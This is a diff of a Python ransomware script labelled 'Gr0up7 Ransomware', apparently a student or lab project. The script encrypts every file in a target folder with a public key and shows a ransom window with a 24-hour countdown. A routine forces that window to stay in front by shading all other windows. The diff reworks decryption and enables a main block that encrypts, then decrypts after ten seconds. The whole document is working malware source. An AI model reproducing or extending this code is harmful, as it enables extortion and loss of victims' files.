@@ -17,7 +17,7 @@ import subprocess
 #################################################     INITIALIZATIONS     #################################################
 ###########################################################################################################################
 
-ENCRYPT_FOLDER_PATH = '/home/victim/Desktop/TestFolder/'  # CHANGE THIS
+ENCRYPT_FOLDER_PATH = '/home/aleix/Desktop/TestFolder/'  # CHANGE THIS
 EXCLUDED_EXTENSIONS = ['.py', '.pem', '.exe']  # CHANGE THIS
 RANWOMWARE_WINDOW_NAME = 'Gr0up7 Ransomware'  # CHANGE THIS
 
@@ -52,13 +52,14 @@ class GUI(Thread):
         label1.pack()
         self.label = tk.Label(self.root,font=('calibri', 50,'bold'), fg='white', bg='blue')
         self.label.pack()
-        decrypt_button = tk.Button(self.root, text='Decrypt', command=decryption_traversal)
+        decrypt_button = tk.Button(self.root, text='Decrypt', command=self.decryption_traversal)
+        # decrypt_button = tk.Button(self.root, text='Decrypt', command=lambda: decryption_traversal(self.root))
         decrypt_button.pack()
 
         # call countdown first time
         self.countdown('23:59:59')
 
-        Thread(target=keep_active_window, daemon=True).start()
+        # Thread(target=keep_active_window, daemon=True).start()
 
         self.root.mainloop()
 
@@ -84,6 +85,18 @@ class GUI(Thread):
                 minute = 59
                 second = 59
             self.root.after(1000, self.countdown, '{}:{}:{}'.format(hour, minute, second))
+
+    def decryption_traversal(self):
+        if not os.path.exists('./media/private.pem'): return
+
+        for item in scanRecurse(ENCRYPT_FOLDER_PATH):
+            filePath = Path(item)
+            fileType = filePath.suffix.lower()
+
+            if fileType in EXCLUDED_EXTENSIONS: continue
+            decrypt(str(filePath), './media/private.pem')
+
+        self.root.destroy()
 
 ###########################################################################################################################
 
@@ -165,14 +178,6 @@ def encryption_traversal():
         if fileType in EXCLUDED_EXTENSIONS: continue
         encrypt(filePath, pubKey)
 
-def decryption_traversal():
-    for item in scanRecurse(ENCRYPT_FOLDER_PATH):
-        filePath = Path(item)
-        fileType = filePath.suffix.lower()
-
-        if fileType in EXCLUDED_EXTENSIONS: continue
-        decrypt(str(filePath), './media/private.pem')
-
 ###########################################################################################################################
 
 def keep_active_window():
@@ -181,7 +186,9 @@ def keep_active_window():
 
         windows_list = ewmh.getClientList()
 
-        if ewmh.getActiveWindow().get_wm_name() != RANWOMWARE_WINDOW_NAME:
+        active_window_name = ewmh.getActiveWindow()
+
+        if type(active_window_name) != type(None) and active_window_name.get_wm_name() != RANWOMWARE_WINDOW_NAME:
             # Go to the desktop minimizing all the windows one by one
             for window in windows_list: 
                 ewmh.setWmState(window, 1, '_NET_WM_STATE_SHADED') 
@@ -203,18 +210,22 @@ def keep_active_window():
 
 ###########################################################################################################################
 
+my_GUI = GUI()
+
 # Deploys the ransomware
 def encrypt_ransomware():
+    global my_GUI
+
     encryption_traversal()
 
-    my_GUI = GUI()
     my_GUI.start()
 
     return
 
 # Deploys the ransomware
 def decrypt_ransomware():
-    decryption_traversal()
+
+    my_GUI.decryption_traversal()
 
     return
 
@@ -229,10 +240,10 @@ def run():
     success = True
     return success
 
-#if __name__ == "__main__":
-    #from time import sleep
-    #encrypt_ransomware()
-    #decrypt_ransomware()
+if __name__ == "__main__":
+    from time import sleep
+    encrypt_ransomware()
+    sleep(10)
+    decrypt_ransomware()
     # Uncomment to check if Tkinter can run on a different thread without freezing
     # for i in range(1000000): print(i)
-    #sleep(2)
